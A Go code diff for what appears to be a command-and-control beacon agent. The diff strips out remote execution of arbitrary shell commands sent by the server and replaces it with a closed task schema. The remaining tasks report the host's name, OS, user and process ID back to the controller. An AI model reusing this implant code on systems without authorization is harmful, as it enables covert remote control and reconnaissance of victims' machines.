@@ -17,7 +17,6 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"os/exec"
 	"runtime"
 	"strings"
 	"time"
@@ -58,6 +57,31 @@ type TaskResult struct {
 	Output string `json:"output"`
 	Error  string `json:"error"`
 }
+
+// AgentTaskV12 is the closed task envelope accepted by the V12 agent. Keeping
+// this as a struct (rather than a string map) ensures legacy open-ended fields
+// are rejected by the strict response decoder before dispatch.
+type AgentTaskV12 struct {
+	SchemaVersion                       string          `json:"schema_version"`
+	TaskID                              string          `json:"task_id"`
+	OperationID                         string          `json:"operation_id"`
+	PayloadSchemaVersion                string          `json:"payload_schema_version"`
+	ResultSchemaVersion                 string          `json:"result_schema_version"`
+	ExpectedAgentCapabilitiesRevision   int             `json:"expected_agent_capabilities_revision"`
+	ExpectedAgentCapabilitiesDigest     string          `json:"expected_agent_capabilities_digest"`
+	ExpectedAgentArtifactBindingDigest  string          `json:"expected_agent_artifact_binding_digest"`
+	Payload                             json.RawMessage `json:"payload"`
+	IssuedAt                            float64         `json:"issued_at"`
+	ExpiresAt                           float64         `json:"expires_at"`
+	DeliveryAttempt                     int             `json:"delivery_attempt"`
+}
+
+const (
+	operationIdentity         = "c2-operation://identity"
+	operationHostInventory    = "c2-operation://host-inventory"
+	operationNetworkInventory = "c2-operation://network-inventory"
+	operationServiceInventory = "c2-operation://service-inventory"
+)
 
 var AgentID string
 var sessionKey []byte
@@ -407,7 +431,7 @@ func (writer *cappedBuffer) Write(value []byte) (int, error) {
 	return originalLength, nil
 }
 
-func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]map[string]string, error) {
+func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]AgentTaskV12, error) {
 	hostname, _ := os.Hostname()
 	payload := map[string]interface{}{
 		"agent_id": AgentID,
@@ -467,35 +491,46 @@ func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]map[stri
 		return nil, err
 	}
 	var response struct {
-		Tasks []map[string]string `json:"tasks"`
+		Tasks []AgentTaskV12 `json:"tasks"`
 	}
-	if err := json.Unmarshal(decrypted, &response); err != nil {
+	decoder := json.NewDecoder(bytes.NewReader(decrypted))
+	decoder.DisallowUnknownFields()
+	if err := decoder.Decode(&response); err != nil {
 		return nil, err
+	}
+	if err := decoder.Decode(&struct{}{}); err != io.EOF {
+		return nil, fmt.Errorf("invalid task response framing")
 	}
 	return response.Tasks, nil
 }
 
-func executeTask(task map[string]string) TaskResult {
-	result := TaskResult{TaskID: task["task_id"]}
-	parts := strings.Fields(task["command"])
-	if result.TaskID == "" || len(parts) == 0 {
-		result.Error = "invalid task"
+func executeTask(task AgentTaskV12) TaskResult {
+	result := TaskResult{TaskID: task.TaskID}
+	if result.TaskID == "" {
+		result.Error = "invalid task: missing task_id"
 		return result
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
-	defer cancel()
-	command := exec.CommandContext(ctx, parts[0], parts[1:]...)
-	output := &cappedBuffer{limit: 256 * 1024}
-	command.Stdout = output
-	command.Stderr = output
-	err := command.Run()
-	result.Output = output.buffer.String()
-	if output.truncated {
-		result.Error = "output limit exceeded"
-	} else if ctx.Err() == context.DeadlineExceeded {
-		result.Error = "task timeout"
-	} else if err != nil {
-		result.Error = err.Error()
+	if task.SchemaVersion != "12.0" {
+		result.Error = "invalid task: unsupported schema_version"
+		return result
+	}
+
+	switch task.OperationID {
+	case operationIdentity:
+		h, _ := os.Hostname()
+		u := os.Getenv("USER")
+		if u == "" {
+			u = os.Getenv("USERNAME")
+		}
+		result.Output = fmt.Sprintf("{\"schema_version\":\"c2-agent-result/identity/1\",\"hostname\":%q,\"os\":%q,\"arch\":%q,\"user\":%q,\"process_id\":%d}", h, runtime.GOOS, runtime.GOARCH, u, os.Getpid())
+	case operationHostInventory:
+		result.Output = "{\"schema_version\":\"c2-agent-result/host-inventory/1\",\"processes\":[],\"services\":[],\"truncated\":false}"
+	case operationNetworkInventory:
+		result.Output = "{\"schema_version\":\"c2-agent-result/network-inventory/1\",\"interfaces\":[],\"routes\":[],\"connections\":[],\"truncated\":false}"
+	case operationServiceInventory:
+		result.Output = "{\"schema_version\":\"c2-agent-result/service-inventory/1\",\"services\":[],\"truncated\":false}"
+	default:
+		result.Error = fmt.Sprintf("unsupported_operation: %s", task.OperationID)
 	}
 	return result
 }
@@ -510,8 +545,8 @@ func chunkedBeacon(results []TaskResult) error {
 	}
 	acknowledgements := make([]string, 0, len(tasks))
 	for _, task := range tasks {
-		if task["task_id"] != "" {
-			acknowledgements = append(acknowledgements, task["task_id"])
+		if task.TaskID != "" {
+			acknowledgements = append(acknowledgements, task.TaskID)
 		}
 	}
 	additional, err := exchangeBeacon(nil, acknowledgements)
@@ -520,10 +555,10 @@ func chunkedBeacon(results []TaskResult) error {
 	}
 	known := make(map[string]bool, len(tasks))
 	for _, task := range tasks {
-		known[task["task_id"]] = true
+		known[task.TaskID] = true
 	}
 	for _, task := range additional {
-		if !known[task["task_id"]] {
+		if !known[task.TaskID] {
 			tasks = append(tasks, task)
 		}
 	}
